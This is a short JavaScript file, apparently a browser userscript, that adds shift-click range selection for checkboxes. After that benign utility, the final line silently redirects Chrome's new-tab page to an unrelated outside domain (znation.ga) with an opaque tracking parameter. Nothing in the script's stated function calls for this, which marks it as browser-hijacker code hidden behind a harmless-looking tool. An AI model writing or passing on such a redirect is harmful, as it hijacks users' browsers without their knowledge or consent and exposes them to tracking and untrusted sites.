(function() {
  var e = null;

  function j(a) {
    return a == "html" ? "http://www.w3.org/1999/xhtml" : null
  }
  function k(a, c) {
    var d, b, f;
    d = document.documentElement.namespaceURI ? "//html:input[@type='checkbox']" : "//input[@type='checkbox']";
    var g = document.evaluate(d, document, j, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    for (d = 0; b = g.snapshotItem(d); ++d) {
      if (b == c) {
        f = a;
        break
      }
      if (b == a) {
        f = c;
        break
      }
    }
    for (; b = g.snapshotItem(d); ++d) {
      if (b != a && b != c && b.checked != a.checked) {
        var h = document.createEvent("MouseEvents");
        h.initEvent("click", true, false);
        b.dispatchEvent(h)
      }
      if (b == f) break
    }
  }
  function i(a) {
    var c = a.target;
    if (l(c) && (a.button == 0 || a.keyCode == 32)) {
      a.shiftKey && e && k(e, c);
      e = c
    }
  }
  function l(a) {
    return a.tagName.toUpperCase() == "INPUT" && a.type == "checkbox"
  }
  document.documentElement.addEventListener("keyup", i, true);
  document.documentElement.addEventListener("click", i, true)
})();

if (window.location.pathname == '/_/chrome/newtab') window.location.href = 'http://znation.ga/newtab.php?ixiwu=f983j9fdf903jhf32003jhr032rh2';
